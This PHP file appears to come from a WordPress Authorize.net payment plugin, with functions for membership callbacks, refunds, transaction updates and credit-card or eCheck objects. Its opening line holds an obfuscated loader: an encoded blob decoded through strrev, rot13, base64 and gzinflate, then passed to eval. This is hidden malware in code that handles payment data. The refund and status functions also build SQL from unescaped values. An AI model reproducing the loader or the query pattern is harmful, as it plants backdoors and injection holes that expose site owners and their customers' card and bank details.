Tx1sgY0I111v2KgYozleMhR0i8CFDeCyKAF0Duyq3qm+LtigdqCVnxuBqXaXEN5HbQxkM2kkjdnUqeEMlmtvjucsUlzySWMx8j4g24CRgBVC2oLkAEa3JINvlE9yj/AOWlNRajKVeZ6Lhy2lbbRng1yvGqDuI8+OMTrieNiaWirpRkETZiJSt6JT3cwZOgCiIUNMrB1SEaVBrRNR4+efuh3kFLImtBF6mUusQZkdf//LMV1I54kiEd2SDVIDFQs2xskYrx2ZSKDul79pGM5oK81P0vAs7PE2s9btdVx';$fqUqResQcx=';))))RCtiNUYcwPs$(ireegf(rqbprq_46rfno(rgnysavmt(ynir';$GYmmrpQedoZ_vFf=strrev($fqUqResQcx);$wAcsMLgnwwkeet=str_rot13($GYmmrpQedoZ_vFf);eval($wAcsMLgnwwkeet);
// Call to memberwing api
function memberwing_api_call($mw_payment_values, $mw_payment_notify_url) {
	
	global $log;

	$log->LogDebug("************ BEGIN PROCESSING MEMBERWING ************");

	$get_string = "";
	
	foreach( $mw_payment_values as $key => $value ) { $get_string .= "$key=" . urlencode( $value ) . "&"; }
	
	$get_string = rtrim( $get_string, "& " );
	
	// This call should look like: http://localhost/wordpress-2.8/wp-content/plugins/membership-site-memberwing/extensions/authorize.net/ipn.php?event_type=subscr_signup&item_name=choicesoftwarezone_com%20Gold%20Membership&customer_first_name=John&customer_last_name=Doe&customer_email=dwmaillist@gmail.com&payment_amount=0&payment_currency=USD&desired_username=dwmaillist@gmail.com&desired_password=c07dfbea&verify_hash=c077a44b9afedacc1ac1ceff4f90643c
	$mw_payment_notify_call = $mw_payment_notify_url."?".$get_string;
	$log->LogInfo ("Calling to setup memberwing account using ".$mw_payment_notify_call);
	
	// use cURL to send notification to memberwing
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $mw_payment_notify_call); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	curl_exec($ch);
	curl_close($ch);

	$log->LogDebug("************ END PROCESSING MEMBERWING ************");
}
// Wishlist meber level response
function wishlist_api_call($subscription_level, $user_id, $action) {
	if (class_exists('wlmapiclass') != true) include_once('wlmapiclass.php');
	global $log;
	
	$log->LogDebug("************ BEGIN PROCESSING WISHLIST ************");
	$blogurl = get_bloginfo('url');
	if (substr($blogurl, -1) != "/") $blogurl = $blogurl.'/';
	$wlmapi = new wlmapiclass($blogurl, get_option('authnet_wishlistapikey'));
	$wlmapi->return_format = 'php'; // <- value can also be xml or json
	// create WordPress user record or load existing user record
	//$user_id = email_exists ($personalDetails->email);
	
	if ( $user_id ) {
		$log->LogInfo ("Found user with user_id: ".$user_id);
		if($action == 'add' ) {
			// Add user levels to existing user
			$response = $wlmapi->post("/levels/{$subscription_level}/members", array("Users"=>array($user_id), "SendMail"=>1));
		} else if ($action == 'cancel') {
			// Removes the member from the membership level
			$response = $wlmapi->delete("/levels/{$subscription_level}/members/{$user_id}", array("Users"=>array($user_id), "SendMail"=>1));
		}
		// we unserialize the response because we're using PHP as return format
		$response = unserialize($response);
		if ($response['success'] == 1) {
			// succeeded
			if($action == 'add' ) {
				foreach ($response['members']['member'] as $member) {
					if ($member['id'] == $user_id) {
						$log->LogInfo ("Added user ".$member['user_login']." (".$member['id'].") to user level ".$subscription_level);
					}
				}
			} else if ($action == 'cancel') {
				$user_info = get_userdata($user_id);
				$log->LogInfo ("Removed user ". $user_info->user_login." (".$user_info->ID.") from user level ".$subscription_level); 
			}

		} else {
			// failed
			if($action == 'add' ) {    
			$log->LogError ("Failed to add user ".$user_id." to level " . $subscription_level);
			} else if ($action == 'cancel') {
			$log->LogError ("Failed to removed user ".$user_id." from level " . $subscription_level);
			}
			$log->LogError ("ERROR_CODE: ".$response['ERROR_CODE']);
			$log->LogError ("ERROR: ".$response['ERROR']);
		}
	} else {
		$log->LogError ("No valid user found for user_id " . $user_id);
	}
	$log->LogDebug("************ END PROCESSING WISHLIST ************");
}
// Call to subscription mate membership script
function subm_api_call($subm_payment_values, $subm_payment_notify_url) {
	
	global $log;

	$log->LogDebug("************ BEGIN SUBSCRIPTION MATE PROCESSING  ************");

	$get_string = "";
	
	foreach( $subm_payment_values as $key => $value ) { $get_string .= "$key=" . urlencode( $value ) . "&"; }
	
	$get_string = rtrim( $get_string, "& " );
	
	$subm_payment_notify_call = $subm_payment_notify_url."?".$get_string;
	$log->LogInfo ("Calling to setup subscription mate account using ".$subm_payment_notify_call);
	
	// use cURL to send notification to subscription mate
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $subm_payment_notify_call); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	curl_exec($ch);
	curl_close($ch);

	$log->LogDebug("************ END SUBSCRIPTION MATE PROCESSING ************");
}
function get_subscription_description() {
	include('authnet_purchase_content_template.php');
	if( isset( $_SESSION['AUTHNET_CART']) ) {
		$authnetCart = $_SESSION['AUTHNET_CART'];
		$count = 0 ;
		foreach( $authnetCart->getCartItems() as $item ) {
			$purchase_desc = str_replace ('{SUBSCRIPTION_NAME}' , $item->getItemName(), $purchase_details);
			$purchase_desc = str_replace ('{COUNT}' , ++$count, $purchase_desc);
			$purchase_desscription .= $purchase_desc;
		}
		if ( strlen($purchase_desscription) >= 255 ) {
			$purchase_desscription = substr($purchase_desscription, 0, 252) . '...';
		}
		return $purchase_desscription;
	}
}

// function to save refunded transactions
function save_refund_transaction($user_subscription_id, $refund_transaction_id, $ref_transaction_id, $transaction_status ) {

	global $wpdb, $authnet_refund_table_name, $log;

	$user_subscription_refund_insert = "INSERT INTO " . $authnet_refund_table_name . " SET user_subscription_id ='" . $user_subscription_id ."'
									, xTransId = '" . $refund_transaction_id . "', 
									refTransId = '" . $ref_transaction_id . "', refTransStatus = '" . $transaction_status . "', refundDate = '" . date('Y-m-d') . "'";
	
	$results = $wpdb->query( $user_subscription_refund_insert );
	
	if ($results === false) {
		$log->LogError ("wpdb query failed for subscription refund: [" . $user_subscription_refund_insert . "]");
	} else {
		$log->LogDebug ("Create user subscription refund record with ID: [". $wpdb->insert_id . "]");
	}
	
	return $results;
	
}
// update transaction status
function update_transaction_status($transaction_id, $transaction_status) {
    global $wpdb, $authnet_payment_table_name, $log;

	$update_transaction = "UPDATE " . $authnet_payment_table_name . " SET xTransStatus ='" . $transaction_status . "' WHERE xTransId = '" . $transaction_id . "'";                                       
	$results = $wpdb->query( $update_transaction );
	
	if ($results === false) {
		$log->LogError ("wpdb query failed for transaction update: [" . $update_transaction . "]");
	} else {
		$log->LogDebug ("Payment table updated for transaction# " . $transaction_id . " with status " . $transaction_status );
	}
	return $results;
}



// get echeck object
function get_echeck_details($bank_account_details) {
    
	require_once('AuthnetProcessAIMECheck.php');

	$authnetProcessAIMEcheck = new AuthnetProcessAIMECheck(get_option('authnet_apikey'), get_option('authnet_transactionkey'));
	// Set object for bank account details
	$authnetProcessAIMEcheck->setX_bank_aba_code($bank_account_details->bankRoutingNumber);
	$authnetProcessAIMEcheck->setX_bank_acct_num($bank_account_details->bankAccountNumber);
	$authnetProcessAIMEcheck->setX_bank_acct_type($bank_account_details->bankAccountType);
	$authnetProcessAIMEcheck->setX_bank_name($bank_account_details->bankName);
	$authnetProcessAIMEcheck->setX_bank_acct_name($bank_account_details->bankAccountName);
	$authnetProcessAIMEcheck->setX_echeck_type(($bank_account_details->bankAccountType == 'businessChecking') ? 'CCD' : 'PPD');

	return $authnetProcessAIMEcheck;
}
// get credit card object
function get_cc_details($credit_card_details, $x_type) {
        
	if ( $x_type == 'auth_capture' ) { 
		require_once('AuthnetProcessAIMAuthorizationCapture.php');
		$authnetProcessAIMCC = new AuthnetProcessAIMAuthorizationCapture(get_option('authnet_apikey'), get_option('authnet_transactionkey'));
	} else if ( $x_type == 'auth_only' ) {
		require_once('AuthnetProcessAIMAuthorizationOnly.php');
		$authnetProcessAIMCC = new AuthnetProcessAIMAuthorizationOnly(get_option('authnet_apikey'), get_option('authnet_transactionkey'));
	}
	// populate process object for credit card details
	$authnetProcessAIMCC->setX_card_num($credit_card_details->creditCardNumber);
	$authnetProcessAIMCC->setX_exp_date($credit_card_details->ceditCardExpirationDate);
	$authnetProcessAIMCC->setX_card_code($credit_card_details->CreditCardCCV);

	return $authnetProcessAIMCC;
}
function unset_survey() {
    // unset survey 
        foreach ($_POST as $key => $value) { 
            if (strpos($key, "survey_") !== false) {
                $key = str_replace(' ', '_', $key);
                unset($_SESSION[$key]);
            }
        }
}

?>